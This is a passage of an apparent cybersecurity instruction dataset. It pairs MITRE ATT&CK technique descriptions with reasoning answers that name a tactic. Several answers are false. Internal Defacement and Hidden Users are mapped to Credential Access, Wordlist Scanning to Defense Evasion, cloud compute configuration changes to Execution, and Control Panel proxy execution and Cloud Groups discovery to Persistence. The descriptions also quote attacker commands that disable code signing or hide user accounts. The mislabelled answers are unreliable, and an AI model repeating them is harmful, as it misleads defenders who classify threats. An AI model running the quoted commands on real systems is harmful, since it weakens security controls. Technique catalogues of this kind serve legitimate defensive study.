      "question": "Which tactic is related to the following description - Adversaries may masquerade malicious payloads as legitimate files through changes to the payload's formatting, including the file\u2019s signature, extension, and contents. Various file types have a typical standard format, including how they are encoded and organized. For example, a file\u2019s signature (also known as header or magic bytes) is the beginning bytes of a file and is often used to identify the file\u2019s type. For example, the header of a JPEG file,  is <code> 0xFF 0xD8</code> and the file extension is either `.JPE`, `.JPEG` or `.JPG`. \n\nAdversaries may edit the header\u2019s hex code and/or the file extension of a malicious payload in order to bypass file validation checks and/or input sanitization. This behavior is commonly used when payload files are transferred (e.g., Ingress Tool Transfer) and stored (e.g., Upload Malware) so that adversaries may move their malware without triggering detections. \n\nCommon non-executable file types and extensions, such as text files (`.txt`) and image files (`.jpg`, `.gif`, etc.) may be typically treated as benign.  Based on this, adversaries may use a file extension to disguise malware, such as naming a PHP backdoor code with a file name of <code>test.gif</code>. A user may not know that a file is malicious due to the benign appearance and file extension.\n\nPolygot files, which are files that have multiple different file types and that function differently based on the application that will execute them, may also be used to disguise malicious malware and capabilities.",
      "answer": "The given description is related to sub technique Masquerade File Type (T1036.008);\nSub technique Masquerade File Type (T1036.008) is a type of technique Masquerading (T1036);\nTechnique Masquerading (T1036) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.\n\nAn adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. Exploits) or to attempt to develop one themselves (i.e. Exploits).",
    "context": "",
    "output": "The given description is related to sub technique: Vulnerabilities (T1588.006);\nSub technique Vulnerabilities (T1588.006) is a type of technique Obtain Capabilities (T1588);\nTechnique Obtain Capabilities (T1588) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.\n\nAn adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. Exploits) or to attempt to develop one themselves (i.e. Exploits).",
      "answer": "The given description is related to sub technique: Vulnerabilities (T1588.006);\nSub technique Vulnerabilities (T1588.006) is a type of technique Obtain Capabilities (T1588);\nTechnique Obtain Capabilities (T1588) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper. Disturbing or offensive images may be used as a part of Internal Defacement in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.?",
    "context": "",
    "output": "The given description is related to sub technique Internal Defacement (T1491.001);\nSub technique Internal Defacement (T1491.001) is a type of technique Defacement (T1491);\nTechnique Defacement (T1491) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper. Disturbing or offensive images may be used as a part of Internal Defacement in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.",
      "answer": "The given description is related to sub technique Internal Defacement (T1491.001);\nSub technique Internal Defacement (T1491.001) is a type of technique Defacement (T1491);\nTechnique Defacement (T1491) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system. \n\nSome of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS. Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.\n\nAdversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, Modify Registry, rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory. Examples of commands that can modify the code signing policy of a system include <code>bcdedit.exe -set TESTSIGNING ON</code> on Windows and <code>csrutil disable</code> on macOS. Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.\n\nTo gain access to kernel memory to modify variables related to signature checks, such as modifying <code>g_CiOptions</code> to disable Driver Signature Enforcement, adversaries may conduct Exploitation for Privilege Escalation using a signed, but vulnerable driver.?",
    "context": "",
    "output": "The given description is related to sub technique Code Signing Policy Modification (T1553.006);\nSub technique Code Signing Policy Modification (T1553.006) is a type of technique Subvert Trust Controls (T1553);\nTechnique Subvert Trust Controls (T1553) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system. \n\nSome of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS. Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.\n\nAdversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, Modify Registry, rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory. Examples of commands that can modify the code signing policy of a system include <code>bcdedit.exe -set TESTSIGNING ON</code> on Windows and <code>csrutil disable</code> on macOS. Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.\n\nTo gain access to kernel memory to modify variables related to signature checks, such as modifying <code>g_CiOptions</code> to disable Driver Signature Enforcement, adversaries may conduct Exploitation for Privilege Escalation using a signed, but vulnerable driver.",
      "answer": "The given description is related to sub technique Code Signing Policy Modification (T1553.006);\nSub technique Code Signing Policy Modification (T1553.006) is a type of technique Subvert Trust Controls (T1553);\nTechnique Subvert Trust Controls (T1553) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may iteratively probe infrastructure using brute-forcing and crawling techniques. While this technique employs similar methods to Brute Force, its goal is the identification of content and infrastructure rather than the discovery of valid credentials. Wordlists used in these scans may contain generic, commonly used names and file extensions or terms specific to a particular software. Adversaries may also create custom, target-specific wordlists using data gathered from other Reconnaissance techniques (ex: Gather Victim Org Information, or Search Victim-Owned Websites).\n\nFor example, adversaries may use web content discovery tools such as Dirb, DirBuster, and GoBuster and generic or custom wordlists to enumerate a website\u2019s pages and directories. This can help them to discover old, vulnerable pages or hidden administrative portals that could become the target of further operations (ex: Exploit Public-Facing Application or Brute Force).  \n\nAs cloud storage solutions typically use globally unique names, adversaries may also use target-specific wordlists and tools such as s3recon and GCPBucketBrute to enumerate public and private buckets on cloud infrastructure. Once storage objects are discovered, adversaries may leverage Data from Cloud Storage to access valuable information that can be exfiltrated or used to escalate privileges and move laterally.?",
    "context": "",
    "output": "The given description is related to sub technique: Wordlist Scanning (T1595.003);\nSub technique Wordlist Scanning (T1595.003) is a type of technique Active Scanning (T1595);\nTechnique Active Scanning (T1595) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may iteratively probe infrastructure using brute-forcing and crawling techniques. While this technique employs similar methods to Brute Force, its goal is the identification of content and infrastructure rather than the discovery of valid credentials. Wordlists used in these scans may contain generic, commonly used names and file extensions or terms specific to a particular software. Adversaries may also create custom, target-specific wordlists using data gathered from other Reconnaissance techniques (ex: Gather Victim Org Information, or Search Victim-Owned Websites).\n\nFor example, adversaries may use web content discovery tools such as Dirb, DirBuster, and GoBuster and generic or custom wordlists to enumerate a website\u2019s pages and directories. This can help them to discover old, vulnerable pages or hidden administrative portals that could become the target of further operations (ex: Exploit Public-Facing Application or Brute Force).  \n\nAs cloud storage solutions typically use globally unique names, adversaries may also use target-specific wordlists and tools such as s3recon and GCPBucketBrute to enumerate public and private buckets on cloud infrastructure. Once storage objects are discovered, adversaries may leverage Data from Cloud Storage to access valuable information that can be exfiltrated or used to escalate privileges and move laterally.",
      "answer": "The given description is related to sub technique: Wordlist Scanning (T1595.003);\nSub technique Wordlist Scanning (T1595.003) is a type of technique Active Scanning (T1595);\nTechnique Active Scanning (T1595) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.\n\nSilver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.\n\nPassword hashes for target services may be obtained using OS Credential Dumping or Kerberoasting.",
    "context": "",
    "output": "The given description is related to sub technique Silver Ticket (T1558.002);\nSub technique Silver Ticket (T1558.002) is a type of technique Steal or Forge Kerberos Tickets (T1558);\nTechnique Steal or Forge Kerberos Tickets (T1558) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.\n\nSilver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.\n\nPassword hashes for target services may be obtained using OS Credential Dumping or Kerberoasting.",
      "answer": "The given description is related to sub technique Silver Ticket (T1558.002);\nSub technique Silver Ticket (T1558.002) is a type of technique Steal or Forge Kerberos Tickets (T1558);\nTechnique Steal or Forge Kerberos Tickets (T1558) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may modify settings that directly affect the size, locations, and resources available to cloud compute infrastructure in order to evade defenses. These settings may include service quotas, subscription associations, tenant-wide policies, or other configurations that impact available compute. Such modifications may allow adversaries to abuse the victim\u2019s compute resources to achieve their goals, potentially without affecting the execution of running instances and/or revealing their activities to the victim.\n\nFor example, cloud providers often limit customer usage of compute resources via quotas. Customers may request adjustments to these quotas to support increased computing needs, though these adjustments may require approval from the cloud provider. Adversaries who compromise a cloud environment may similarly request quota adjustments in order to support their activities, such as enabling additional Resource Hijacking without raising suspicion by using up a victim\u2019s entire quota. Adversaries may also increase allowed resource usage by modifying any tenant-wide policies that limit the sizes of deployed virtual machines.\n\nAdversaries may also modify settings that affect where cloud resources can be deployed, such as enabling Unused/Unsupported Cloud Regions. In Azure environments, an adversary who has gained access to a Global Administrator account may create new subscriptions in which to deploy resources, or engage in subscription hijacking by transferring an existing pay-as-you-go subscription from a victim tenant to an adversary-controlled tenant. This will allow the adversary to use the victim\u2019s compute resources without generating logs on the victim tenant.?",
    "context": "",
    "output": "The given description is related to sub technique: Modify Cloud Compute Configurations (T1578.005);\nSub technique Modify Cloud Compute Configurations (T1578.005) is a type of technique Modify Cloud Compute Infrastructure (T1578);\nTechnique Modify Cloud Compute Infrastructure (T1578) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may modify settings that directly affect the size, locations, and resources available to cloud compute infrastructure in order to evade defenses. These settings may include service quotas, subscription associations, tenant-wide policies, or other configurations that impact available compute. Such modifications may allow adversaries to abuse the victim\u2019s compute resources to achieve their goals, potentially without affecting the execution of running instances and/or revealing their activities to the victim.\n\nFor example, cloud providers often limit customer usage of compute resources via quotas. Customers may request adjustments to these quotas to support increased computing needs, though these adjustments may require approval from the cloud provider. Adversaries who compromise a cloud environment may similarly request quota adjustments in order to support their activities, such as enabling additional Resource Hijacking without raising suspicion by using up a victim\u2019s entire quota. Adversaries may also increase allowed resource usage by modifying any tenant-wide policies that limit the sizes of deployed virtual machines.\n\nAdversaries may also modify settings that affect where cloud resources can be deployed, such as enabling Unused/Unsupported Cloud Regions. In Azure environments, an adversary who has gained access to a Global Administrator account may create new subscriptions in which to deploy resources, or engage in subscription hijacking by transferring an existing pay-as-you-go subscription from a victim tenant to an adversary-controlled tenant. This will allow the adversary to use the victim\u2019s compute resources without generating logs on the victim tenant.",
      "answer": "The given description is related to sub technique: Modify Cloud Compute Configurations (T1578.005);\nSub technique Modify Cloud Compute Configurations (T1578.005) is a type of technique Modify Cloud Compute Infrastructure (T1578);\nTechnique Modify Cloud Compute Infrastructure (T1578) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users. \n\nIn macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value <code>Hide500Users</code> to <code>TRUE</code> in the <code>/Library/Preferences/com.apple.loginwindow</code> plist file. Every user has a userID associated with it. When the <code>Hide500Users</code> key value is set to <code>TRUE</code>, users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the <code>dscl</code> utility to create hidden user accounts by setting the <code>IsHidden</code> attribute to <code>1</code>. Adversaries can also hide a user\u2019s home folder by changing the <code>chflags</code> to hidden. \n\nAdversaries may similarly hide user accounts in Windows. Adversaries can set the <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList</code> Registry key value to <code>0</code> for a specific user to prevent that user from being listed on the logon screen.\n\nOn Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the <code>gsettings</code> command (ex: <code>sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true</code>). Display Managers are not anchored to specific distributions and may be changed by a user or adversary.",
    "context": "",
    "output": "The given description is related to sub technique Hidden Users (T1564.002);\nSub technique Hidden Users (T1564.002) is a type of technique Hide Artifacts (T1564);\nTechnique Hide Artifacts (T1564) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users. \n\nIn macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value <code>Hide500Users</code> to <code>TRUE</code> in the <code>/Library/Preferences/com.apple.loginwindow</code> plist file. Every user has a userID associated with it. When the <code>Hide500Users</code> key value is set to <code>TRUE</code>, users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the <code>dscl</code> utility to create hidden user accounts by setting the <code>IsHidden</code> attribute to <code>1</code>. Adversaries can also hide a user\u2019s home folder by changing the <code>chflags</code> to hidden. \n\nAdversaries may similarly hide user accounts in Windows. Adversaries can set the <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList</code> Registry key value to <code>0</code> for a specific user to prevent that user from being listed on the logon screen.\n\nOn Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the <code>gsettings</code> command (ex: <code>sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true</code>). Display Managers are not anchored to specific distributions and may be changed by a user or adversary.",
      "answer": "The given description is related to sub technique Hidden Users (T1564.002);\nSub technique Hidden Users (T1564.002) is a type of technique Hide Artifacts (T1564);\nTechnique Hide Artifacts (T1564) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.\n\nControl Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a <code>CPlApplet</code> function. For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel. Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file. \n\nMalicious Control Panel items can be delivered via Phishing campaigns or executed as part of multi-stage malware. Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.\n\nAdversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls</code>. Even when these registered DLLs do not comply with the CPL file specification and do not export <code>CPlApplet</code> functions, they are loaded and executed through its <code>DllEntryPoint</code> when Control Panel is executed. CPL files not exporting <code>CPlApplet</code> are not directly executable.",
    "context": "",
    "output": "The given description is related to sub technique Control Panel (T1218.002);\nSub technique Control Panel (T1218.002) is a type of technique System Binary Proxy Execution (T1218);\nTechnique System Binary Proxy Execution (T1218) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.\n\nControl Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a <code>CPlApplet</code> function. For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel. Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file. \n\nMalicious Control Panel items can be delivered via Phishing campaigns or executed as part of multi-stage malware. Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.\n\nAdversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls</code>. Even when these registered DLLs do not comply with the CPL file specification and do not export <code>CPlApplet</code> functions, they are loaded and executed through its <code>DllEntryPoint</code> when Control Panel is executed. CPL files not exporting <code>CPlApplet</code> are not directly executable.",
      "answer": "The given description is related to sub technique Control Panel (T1218.002);\nSub technique Control Panel (T1218.002) is a type of technique System Binary Proxy Execution (T1218);\nTechnique System Binary Proxy Execution (T1218) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may leverage Valid Accounts to log directly into accessible cloud hosted compute infrastructure through cloud native methods. Many cloud providers offer interactive connections to virtual infrastructure that can be accessed through the Cloud API, such as Azure Serial Console, AWS EC2 Instance Connect, and AWS System Manager..\n\nMethods of authentication for these connections can include passwords, application access tokens, or SSH keys. These cloud native methods may, by default, allow for privileged access on the host with SYSTEM or root level access. \n\nAdversaries may utilize these cloud native methods to directly access virtual infrastructure and pivot through an environment. These connections typically provide direct console access to the VM rather than the execution of scripts (i.e., Cloud Administration Command).?",
    "context": "",
    "output": "The given description is related to sub technique: Direct Cloud VM Connections (T1021.008);\nSub technique Direct Cloud VM Connections (T1021.008) is a type of technique Remote Services (T1021);\nTechnique Remote Services (T1021) is a type of tactic Lateral Movement (TA0008);\nTherefore, the given description is related to tactic Lateral Movement (TA0008).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may leverage Valid Accounts to log directly into accessible cloud hosted compute infrastructure through cloud native methods. Many cloud providers offer interactive connections to virtual infrastructure that can be accessed through the Cloud API, such as Azure Serial Console, AWS EC2 Instance Connect, and AWS System Manager..\n\nMethods of authentication for these connections can include passwords, application access tokens, or SSH keys. These cloud native methods may, by default, allow for privileged access on the host with SYSTEM or root level access. \n\nAdversaries may utilize these cloud native methods to directly access virtual infrastructure and pivot through an environment. These connections typically provide direct console access to the VM rather than the execution of scripts (i.e., Cloud Administration Command).",
      "answer": "The given description is related to sub technique: Direct Cloud VM Connections (T1021.008);\nSub technique Direct Cloud VM Connections (T1021.008) is a type of technique Remote Services (T1021);\nTechnique Remote Services (T1021) is a type of tactic Lateral Movement (TA0008);\nTherefore, the given description is related to tactic Lateral Movement (TA0008).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\n\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by Component Object Model, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.\n\nMicrosoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via Phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.\n\nDDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a Command and Scripting Interpreter. DDE execution can be invoked remotely via Remote Services such as Distributed Component Object Model (DCOM).",
    "context": "",
    "output": "The given description is related to sub technique: Dynamic Data Exchange (T1559.002);\nSub technique Dynamic Data Exchange (T1559.002) is a type of technique Inter-Process Communication (T1559);\nTechnique Inter-Process Communication (T1559) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\n\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by Component Object Model, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.\n\nMicrosoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via Phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.\n\nDDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a Command and Scripting Interpreter. DDE execution can be invoked remotely via Remote Services such as Distributed Component Object Model (DCOM).",
      "answer": "The given description is related to sub technique: Dynamic Data Exchange (T1559.002);\nSub technique Dynamic Data Exchange (T1559.002) is a type of technique Inter-Process Communication (T1559);\nTechnique Inter-Process Communication (T1559) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.\n\nWith authenticated access there are several tools that can be used to find permissions groups. The <code>Get-MsolRole</code> PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts .\n\nAzure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups. The command <code>az ad user get-member-groups</code> will list groups associated to a user account for Azure while the API endpoint <code>GET https://cloudidentity.googleapis.com/v1/groups</code> lists group resources available to a user for Google. In AWS, the commands `ListRolePolicies` and `ListAttachedRolePolicies` allow users to enumerate the policies attached to a role.\n\nAdversaries may attempt to list ACLs for objects to determine the owner and other accounts with access to the object, for example, via the AWS <code>GetBucketAcl</code> API . Using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object.",
    "context": "",
    "output": "The given description is related to sub technique Cloud Groups (T1069.003);\nSub technique Cloud Groups (T1069.003) is a type of technique Permission Groups Discovery (T1069);\nTechnique Permission Groups Discovery (T1069) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.\n\nWith authenticated access there are several tools that can be used to find permissions groups. The <code>Get-MsolRole</code> PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts .\n\nAzure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups. The command <code>az ad user get-member-groups</code> will list groups associated to a user account for Azure while the API endpoint <code>GET https://cloudidentity.googleapis.com/v1/groups</code> lists group resources available to a user for Google. In AWS, the commands `ListRolePolicies` and `ListAttachedRolePolicies` allow users to enumerate the policies attached to a role.\n\nAdversaries may attempt to list ACLs for objects to determine the owner and other accounts with access to the object, for example, via the AWS <code>GetBucketAcl</code> API . Using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object.",
      "answer": "The given description is related to sub technique Cloud Groups (T1069.003);\nSub technique Cloud Groups (T1069.003) is a type of technique Permission Groups Discovery (T1069);\nTechnique Permission Groups Discovery (T1069) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
